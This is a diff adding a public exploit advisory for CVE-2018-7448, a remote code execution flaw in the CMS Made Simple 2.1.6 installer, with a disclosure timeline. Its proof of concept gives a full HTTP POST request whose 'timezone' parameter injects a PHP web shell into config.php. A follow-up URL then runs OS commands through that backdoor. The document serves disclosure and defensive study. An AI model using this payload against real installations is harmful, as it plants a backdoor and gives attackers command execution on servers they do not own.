@@ -1,0 +1,46 @@
+# Exploit Title: CMS Made Simple 2.1.6 - Remote Code Execution
+# Date: 2018-02-26
+# Exploit Author: Keerati T.
+# Vendor Homepage: http://www.cmsmadesimple.org/
+# Software Link: http://s3.amazonaws.com/cmsms/downloads/13570/cmsms-2.
+1.6-install.zip
+# Version: 2.1.6
+# CVE: CVE-2018-7448
+# Tested on: Linux
+
+1.Description
+Arbitrary PHP code can be injected into configuration file (config.php) after installation has been finished. In order to inject PHP code, fresh install and valid database credentials is required. Application will force an installer (usually "www-data" due to web-based installation) to set a write permission (777) to destination directory and related installation file. An attacker will proceed installation process until reach step 4 and inject malicious PHP code into "timezone" parameter. Once PHP code has been injected to "config.php", an attacker will be able to execute OS command by accessing backdoor "config.php" file along with injected parameter which contain OS command value.
+
+2.Proof of Concept
+- Access to "http://target/path/cmsms-2.1.6-install.php" for installing CMS Made Simple
+- Proceed to step 4 of installation which is database setup stage, enter a valid database credentials and modifying "timezone" parameter on intercepted proxy as following:
+
+==========
+POST /cms/cmsms-2.1.6-install.php/index.php?mdf68c24c=4 HTTP/1.1
+Host: 192.168.5.196
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.5.196/cms/cmsms-2.1.6-install.php/index.
+php?mdf68c24c=4
+Cookie: CMSICc861538bbb=i549m59qpme0u9klupbkb68me4
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 126
+
+dbhost=localhost&dbname=cms&dbuser=xvwa&dbpass=xvwa&
+timezone=junk';echo%20system($_GET['cmd']);$junk='junk&next=Next+%E2%86%92
+==========
+
+- Forward tampered "timezone" parameter packet and proceed to next step until successfully installation.
+- Execute OS command via "config.php" by requesting " http://target/path/config.php?cmd=id;uname"
+
+3.Timeline
+2017-04-14 Vulnerability report
+2017-04-15 Vendor inform that will be fixed on next full release
+2017-06-10 Version 2.2 release and vulnerability fixed
+2018-02-23 CVE assigned
+2018-02-26 Public
